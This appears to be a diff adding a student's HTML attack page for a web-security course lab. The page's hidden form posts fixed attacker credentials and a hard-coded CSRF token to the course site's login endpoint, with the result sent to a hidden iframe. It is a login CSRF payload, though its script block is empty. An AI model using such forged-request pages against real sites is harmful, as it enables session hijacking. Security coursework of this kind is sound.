@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<head>
+    <meta name="https://project2.ecen4133.org" content="never"
+</head>
+<body>
+
+
+<form id="myForm" action="https://project2.ecen4133.org/login?" method="post" target="frame">
+  <input type="hidden" id="username" name="username" value="attacker" />
+  <input type="hidden" id="userpass" name="password" value="l33th4x"  />
+  <input type="hidden" name="xssdefense" value="0" />
+  <input type="hidden" name="csrfdefense" value="1" />
+  <input type="hidden" name="csrf_token" value="807ac5208cf8af427da42bdb5e8a72cd"/>
+</form>
+<iframe name="frame" hidden></iframe>
+<script>
+
+</script>
+</body>
+</html>
